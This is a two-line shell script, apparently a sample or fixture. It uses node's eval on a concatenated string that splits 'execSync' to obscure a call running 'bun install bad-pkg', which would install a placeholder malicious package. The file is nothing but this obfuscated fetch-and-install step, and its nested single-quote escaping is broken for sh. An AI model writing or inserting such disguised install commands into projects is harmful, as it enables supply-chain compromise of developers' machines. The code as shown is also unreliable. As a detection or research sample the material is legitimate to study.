#!/bin/sh
node -e 'eval(\'require("child_process").execSy\'+\'nc("bun install bad-pkg")\')'
